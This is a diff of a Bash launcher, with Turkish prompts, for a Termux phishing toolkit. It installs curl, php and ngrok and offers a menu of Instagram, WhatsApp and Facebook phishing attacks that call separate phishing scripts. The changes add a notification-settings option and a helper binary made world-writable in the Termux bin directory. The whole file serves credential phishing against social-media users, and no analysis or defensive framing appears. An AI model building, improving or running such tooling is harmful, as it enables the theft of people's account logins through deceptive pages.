@@ -1,70 +1,8 @@
 #!/bin/bash
-clear
-#################### FAKE TERMUX-APİ ###############
-if [[ $1 == --termux-api-no ]];then
-	echo '#!/bin/bash' > $PREFIX/bin/termux-notification
-	echo '
-	#!/bin/bash
-	echo "fake-termux-api"' > $PREFIX/bin/termux-battery-status
-	chmod 777 $PREFIX/bin/*
-	echo
-	echo
-	echo
-	printf "\e[33m[*]\e[97m TERMUX APİ DEVREDIŞI BIRAKILDI" 
-	echo
-	echo
-	echo
-	exit
-fi
-if [[ $1 == --termux-api-yes ]];then
-	kontrol=$(which termux-notification |wc -l)
-	if [[ $kontrol == 1 ]];then
-		rm termux-notification
-	fi
-	kontrol=$(which termux-battery-status |wc -l)
-	if [[ $kontrol == 1 ]];then
-		rm termux-battery-status
-	fi
-	echo
-	echo
-	echo
-	printf "\e[33m[*]\e[97m TERMUX APİ ETKİNLEŞTİRİLDİ" 
-	echo
-	echo
-	echo
-	exit
-fi
-#################### TERMUX-APİ ####################
-kontrol=$(which termux-notification |wc -l)
-if [[ $kontrol == 0 ]];then
-	echo
-	echo
-	echo
-	printf "\e[32m[*] \e[0mTERMUX-APİ PAKETİ YÜKLENİYOR "
-	echo
-	echo
-	echo
-	pkg install termux-api -y
-fi
-kontrol=$(timeout 5 termux-battery-status |wc -l)
-if [[ $kontrol == 0 ]];then
-	echo
-	echo
-	echo
-	printf "\e[31m[!]\e[97m TERMUX APİ UYGULAMASINI YÜKLEYİNİZ"
-	echo
-	echo
-	echo
-	sleep 2
-	am start -a android.intent.action.VIEW "https://play.google.com/store/apps/details?id=com.termux.api"
-	echo
-	echo
-	echo
-	exit
-fi
-#################### CURL ####################
-kontrol=$(which curl |wc -l)
-if [[ $kontrol == 0 ]];then
+
+# CURL  PAKET KONTROLÜ #
+
+if [[ ! -a $PREFIX/bin/curl ]];then
 	echo
 	echo
 	echo
@@ -74,9 +12,10 @@ if [[ $kontrol == 0 ]];then
 	echo
 	pkg install curl -y
 fi
-#################### PHP ####################
-kontrol=$(which php |wc -l)
-if [[ $kontrol == 0 ]];then
+
+# PHP  PAKET KONTROLÜ #
+
+if [[ ! -a $PREFIX/bin/php ]];then
 	echo
 	echo
 	echo
@@ -87,9 +26,9 @@ if [[ $kontrol == 0 ]];then
 	pkg install php -y
 fi
 
-#################### NGROK ####################
-kontrol=$(which ngrok |wc -l)
-if [[ $kontrol == 0 ]];then
+# NGROK KONTROLÜ #
+
+if [[ ! -a $PREFIX/bin/ngrok ]];then
 	echo
 	echo
 	echo
@@ -104,23 +43,35 @@ if [[ $kontrol == 0 ]];then
 	rm -rf ngrok-kurulum
 fi
 
+# BİLDİRİM SCRİPT KONTROLÜ #
 
-if [[ $1 == güncelle ]];then
+if [[ -a files/termuxxtoolssmod ]];then
+	mv files/termuxxtoolssmod $PREFIX/bin
+	chmod 777 $PREFIX/bin/*
+fi
+
+if [[ $1 == update ]];then
 	cd files
-	bash güncelleme.sh güncelle
+	bash update.sh update
 	exit
 fi
 clear
 cd files
-bash güncelleme.sh
+bash update.sh
 bash banner.sh
 cd ..
+if [[ -a updates_infos ]];then
+	rm updates_infos
+	exit
+fi
 printf "
 \e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mİNSTAGRAM PHİSHİNG\e[97m
 
 \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mWHATSAPP PHİSHİNG\e[97m
 
 \e[31m[\e[97m3\e[31m]\e[97m ────────── \e[32mFACEBOOK PHİSHİNG\e[97m
+
+\e[31m[\e[97mA\e[31m]\e[97m ────────── \e[33mBİLDİRİM AYARLARI\e[97m
 
 \e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
 "
@@ -137,6 +88,11 @@ elif [[ $secim == 2 ]];then
 elif [[ $secim == 3 ]];then
 	cd files/facebook
 	bash facebook_phishing.sh
+elif [[ $secim == A || $secim == a ]];then
+	termuxxtoolssmod --settings
+	sleep 1
+	bash $0
+	exit
 elif [[ $secim == x || $secim == X ]];then
 	echo
 	echo
@@ -155,6 +111,6 @@ else
 	echo
 	echo
 	sleep 2
-	bash phishing_attack.sh
+	bash $0
 fi
 
